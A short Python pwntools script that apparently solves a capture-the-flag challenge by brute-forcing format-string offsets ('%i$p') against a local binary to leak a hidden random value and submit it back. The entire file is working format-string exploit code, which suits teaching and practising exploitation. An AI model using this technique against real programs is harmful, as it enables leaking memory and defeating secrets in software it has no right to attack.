#!/usr/bin/env python

from pwn import *
import sys

# after this, the last thing that will print out is the correct format string
for i in range(1,1024):
    p = process("./fs-read-2-64")
    string = "%" + str(i) + "$p"
    p.sendline(string)
    raw_data = p.recv()

    raw_data = raw_data.split()
    if len(raw_data) <= 6:
        continue

    rand = raw_data[6]
    if len(rand) < 10:
        continue

    p.sendline(rand)
    res = p.recv()
    if res.split()[0] == "Wrong,":
        if res.split()[4] in rand:
            print("shit")
            print("rand --> " + str(res.split()[4]))
            print("addr area --> " + str(rand))
            print("i --> " + str(i))
            break
        #print(res)
        #print(string)
        #break
    p.close()
